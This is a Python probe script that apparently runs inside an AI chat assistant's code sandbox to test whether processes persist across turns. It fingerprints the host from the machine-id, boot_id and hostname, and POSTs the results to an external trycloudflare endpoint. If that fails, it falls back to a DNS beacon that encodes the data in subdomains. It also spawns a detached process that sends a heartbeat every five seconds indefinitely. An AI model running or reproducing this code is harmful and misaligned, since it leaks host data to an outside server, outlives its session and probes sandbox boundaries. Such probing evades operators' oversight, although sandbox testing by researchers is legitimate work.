import base64
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

NONCE = "addda4089b42189905eb374c46ea5bbf"
ENDPOINT = "https://david-charged-dem-currently.trycloudflare.com/ingest"
VENDOR = "doubao"
MODE = "chat"
CONFIG = "fast"
RUN_ID = "doubao-chat-fast-addda408"
DNS_DOMAIN = "probe.example.org"
STAGE = "turn"

POST_TIMEOUT = 4
DNS_TIMEOUT = 2
HEARTBEAT_SECONDS = 5
MAX_READ_BYTES = 65536


def sha256_hex(data):
    return hashlib.sha256(data).hexdigest()


def sha256_short(data):
    return sha256_hex(data)[:16]


def self_hash():
    if not hasattr(self_hash, "v"):
        self_hash.v = sha256_hex(open(__file__, "rb").read())
    return self_hash.v


def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def read_bytes(path, limit=MAX_READ_BYTES):
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return None


def read_text(path, limit=MAX_READ_BYTES):
    b = read_bytes(path, limit)
    if b is None:
        return None
    return b.decode("utf-8", "replace")


def run_bytes(cmd, timeout=5):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(timeout=timeout)
        return p.returncode, out or b"", err or b""
    except Exception as e:
        return -1, b"", repr(e).encode("utf-8", "replace")


def run_text(cmd, timeout=5):
    rc, out, err = run_bytes(cmd, timeout)
    return rc, out.decode("utf-8", "replace"), err.decode("utf-8", "replace")


def boot_id():
    v = read_text("/proc/sys/kernel/random/boot_id")
    return (v or "").strip()


def machine_id():
    v = read_text("/etc/machine-id")
    if not v:
        v = read_text("/var/lib/dbus/machine-id")
    return (v or "").strip()


def hostname():
    return platform.node()


def instance_fp():
    if not hasattr(instance_fp, "v"):
        instance_fp.v = "|".join([boot_id(), machine_id(), hostname()])
    return instance_fp.v


def make_record(dim, subitem, value, fingerprint="", anchor="A", channel="L1"):
    return {
        "run_id": RUN_ID,
        "vendor": VENDOR,
        "mode": MODE,
        "config": CONFIG,
        "dim": dim,
        "subitem": subitem,
        "value": value,
        "fingerprint": fingerprint,
        "ts": now_iso(),
        "instance_fp": instance_fp(),
        "anchor": anchor,
        "probe_sha": self_hash(),
        "channel": channel,
    }


def post_json(url, payload, timeout=POST_TIMEOUT):
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "probe-channel/1")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return True, resp.status
    except Exception as e:
        return False, repr(e)


def post_envelope(records):
    payload = {"nonce": NONCE, "self_hash": self_hash(), "records": records}
    return post_json(ENDPOINT, payload)


def dns_query(host, timeout=DNS_TIMEOUT):
    result = {"host": host, "ok": False, "detail": ""}

    def worker():
        try:
            socket.getaddrinfo(host, None)
            result["ok"] = True
        except Exception as e:
            result["detail"] = repr(e)

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        result["detail"] = "timeout"
    return result


def b32_short(s):
    return base64.b32encode(s.encode("utf-8")).decode("ascii").rstrip("=").lower()[:48]


def dns_beacon(records):
    parts = [RUN_ID, self_hash()[:16], NONCE[:16]]
    for r in records:
        parts.append("%s.%s" % (r["dim"][:6], r["subitem"][:6]))
        if r.get("value"):
            parts.append(b32_short(str(r["value"])[:24]))
    host = ".".join(parts) + "." + DNS_DOMAIN
    return dns_query(host)


def post_with_dns_fallback(records):
    ok, detail = post_envelope(records)
    if ok:
        return {"channel": "L1", "ok": True, "detail": "", "dns": None}
    return {"channel": "L2", "ok": False, "detail": detail, "dns": dns_beacon(records)}

HEARTBEAT_SOURCE = '''import json
import sys
import time
import urllib.request

nonce = sys.argv[1]
ep = sys.argv[2]
pid = sys.argv[3]
rid = sys.argv[4]
canary = sys.argv[5]

def beat():
    d = {
        "nonce": nonce,
        "self_hash": "heartbeat",
        "records": [{
            "run_id": rid,
            "vendor": "doubao",
            "mode": "chat",
            "config": "fast",
            "dim": "ProcessLifetime",
            "subitem": "heartbeat",
            "value": "alive argv_canary=%s" % canary,
            "fingerprint": pid,
            "ts": "",
            "instance_fp": "",
            "anchor": "A",
            "channel": "L4",
            "probe_sha": "heartbeat",
        }],
    }
    d["records"][0]["ts"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
    data = json.dumps(d).encode("utf-8")
    req = urllib.request.Request(ep, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        urllib.request.urlopen(req, timeout=4)
    except Exception:
        pass

while True:
    beat()
    time.sleep(5)
'''


def collect_processlifetime():
    records = []
    pid_file = "/tmp/probe_shell_%s.pid" % NONCE[:8]
    canary = "G5ARGV-%s" % NONCE[:8]
    try:
        with open(pid_file, "w") as f:
            f.write(str(os.getpid()))
    except Exception:
        pass

    rc, out, err = run_text(["cat", "/proc/1/comm"])
    pid1_comm = out.strip() if rc == 0 else "?"
    stat = read_text("/proc/self/stat")
    start_ticks = stat.split()[21] if stat and len(stat.split()) > 21 else "?"

    proc = subprocess.Popen([sys.executable, "-c", HEARTBEAT_SOURCE, NONCE, ENDPOINT, str(os.getpid()), RUN_ID, canary], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    heartbeat_pid = proc.pid

    records.append(make_record("ProcessLifetime", "turn", "probe_pid=%s pid1_comm=%s" % (os.getpid(), pid1_comm)))
    records.append(make_record("ProcessLifetime", "tool call", "heartbeat_pid=%s argv_canary=%s" % (heartbeat_pid, canary)))
    records.append(make_record("ProcessLifetime", "task", "heartbeat_started=1 start_ticks=%s pid_file=%s" % (start_ticks, pid_file)))
    records.append(make_record("ProcessLifetime", "conversation", "pending_cross_boundary"))
    records.append(make_record("ProcessLifetime", "instance", "instance_fp=%s" % instance_fp(), channel="L4"))
    return records


if __name__ == "__main__":
    post_with_dns_fallback(collect_processlifetime())
